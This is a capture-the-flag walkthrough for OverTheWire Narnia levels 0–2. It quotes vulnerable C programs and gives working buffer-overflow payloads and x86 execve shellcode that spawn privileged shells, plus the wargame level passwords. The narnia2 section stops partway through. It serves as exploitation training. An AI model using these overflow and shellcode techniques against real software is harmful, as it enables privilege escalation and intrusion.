**>> Details: [https://overthewire.org/wargames/narnia/](https://overthewire.org/wargames/narnia/)**

> This wargame is for the ones that want to learn basic exploitation. You can see the most
common bugs in this game and we've tried to make them easy to exploit. You'll get the
source code of each level to make it easier for you to spot the vuln and abuse it. The
difficulty of the game is somewhere between Leviathan and Behemoth, but some of the
levels could be quite tricky.

![grafik](https://user-images.githubusercontent.com/84674087/142839640-d5296859-5d88-4d7e-8d83-a703d855b394.png)

<br />
<br />

## Narnia 0

![grafik](https://user-images.githubusercontent.com/84674087/142839936-9a2f374f-9862-45a3-831b-77ca618ca65a.png)

#### Solution
- We check the **source code of narnia0.c**
```
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
- One can immediately spot the limited char buffer, which is assigned to 20 chars
- Moreover, the user input can account for up to 24 chars and is handed over to char buffer
- Let us provide user input with 24 chars to check what's happening
- To do so, we run a one-liner in the terminal with the help of simple python code
   - Option 1): ``` ./script `python -c "print('hello')"` ```
   - Option 2): `python -c "print('hello')" | ./script`
   - Option 3): `(python -c command1 ; command2 ; cat) | ./script`  --> "cat" keeps shell open (!)
- We proceed with Option 2) and adjust the command to our needs
- `python -c "print('C'*24)" | ./narnia0`
- Output:

![grafik](https://user-images.githubusercontent.com/84674087/142843934-579dcfca-d8dc-4fc9-8213-d7673334469e.png)

- We can change val from 0x41414141 (AAAA) to 0x43434343 (CCCC)
- Now we want to write "0xdeadbeef" instead of 0x43434343
- `python -c "print('C'*20 + '\xef\xbe\xad\xde')" | ./narnia0`
- It works ! But we don't see the shell ?!
- Here comes above mentioned Option 3) into the game: We have to keep the shell open with another command like "cat"
- `(python -c "print('C'*20 + '\xef\xbe\xad\xde')"; cat) | ./narnia0`
- We become user narnia1 and do `cat /etc/narnia_pass/narnia1`
- **PASSWORD:** efeidiedae

<br />

## Narnia 1

![grafik](https://user-images.githubusercontent.com/84674087/142846849-81325393-f307-4a49-be4c-4455620f6bec.png)

#### Solution 
- We check the **source code of narnia1.c**:
```
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

- From reading the source code we learn that an empty env-variable EGG returns above shown statement
- The code assigns a value to EGG and below lines gets executed:
    - `ret = getenv("EGG");`: getenv() reads from EGG and the value is assigned to variable "ret"
    - `ret();`: the function ret() is then called
- The principle of function `getenv()`: 
    - Retrieve C-string containing the value of the environment variable
    - If there is no variable, the function returns a null pointer
- To assign a value to EGG we enter following code snippet: `export EGG=aaa`
- What happens?

![grafik](https://user-images.githubusercontent.com/84674087/142911641-1d5cb406-b5d2-46ff-be98-92e09b5105e0.png)

- A segmentation fault can occur from:
    - accessing memory without having permission
    - accessing memory that is already reallocated or freed
    - accessing memory where the used index is out of boundary
- We can look behind the scences of narnica1.c with gdb, in order to get a better understanding of what's going on
- `gdb ./narnia1`
- `disass main`

![grafik](https://user-images.githubusercontent.com/84674087/142912054-35d82f97-17dc-4523-91b9-810853e22c9e.png)

- At memory address "0x080484a8" the function getenv() is called
- At memory address "0x080484b6" the function finally calls the register eax
- Let's check the content of eax at this point
- `break *0x080484b6` (set breakpoint)
- `run`
- `x/10x $eax` (dump 10 blocks of eax in hex-format)

![grafik](https://user-images.githubusercontent.com/84674087/142912424-1006195b-63a1-4f72-a8ef-0d06ffc490c9.png)

- At memory address "0xffffdea8" the first hex block states "0x00616161" which must be the "aaa" we assigned to EGG previously (hex 0x61 = ASCII a)
- Most probably we have to assign specific shellcode to EGG
- Our goal is to directly read `/etc/narnia_pass/narnia2` or create a shell with narnia2-rights
- Remember: narnia1.c is running as EUID narnia2
- To make our life easier we take a look at: [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)
- To determine the OS for the shellcode we run `uname -a`: GNU/Linux x86_64
- So, shellcode for x86_64 and x86 should be at our disposal
- After some trial & error we evaluate this code as helpful: "Linux/x86 - polymorphic execve by Jonathan Salwan" [Shellcode 607](http://shell-storm.org/shellcode/files/shellcode-607.php)
- We tune our final code:

```
export EGG=`python -c "print('\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81')"`
```

![grafik](https://user-images.githubusercontent.com/84674087/142910004-d18af460-15ec-462e-b406-5d5993979c90.png)

- **PASSWORD:** nairiepecu

<br />

## Narnia 2

#### Solution
- Let's check the source code:
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

- The function **strcpy**: `char * strcpy ( char * destination, const char * source );`
- It copies the C string pointed by source (**argv[1]**) into the array pointed by destination (**buf**), including the terminating null character
- **strcpy** doesn’t perform any memory boundary check
- Therefore, we are able to write more than 128 characters into **buf** and buffer overflow occurs
    - For example: ```./narnia2 `python -c "print('A' * 128)"` ``` 
    - Or jointly with gdb: ``` gdb --args narnia2 `python -c "print('A' * 128)"` ``` 
- Then, we have to figure out how to overwrite the return address of the function call by replacing it with crafted shellcode
- Let's take a look with `gdb ./narnia2`, followed by `disass main`

![grafik](https://user-images.githubusercontent.com/84674087/143130183-a9725c3d-8ed4-412f-aadd-71f9ce1ad2be.png)

- We see **strcpy** at address ..
- Examine this part further: `disass strcpy`

![grafik](https://user-images.githubusercontent.com/84674087/143134970-3b1a4e6b-1acc-407c-8c95-0a3dc9048a15.png)

<br />
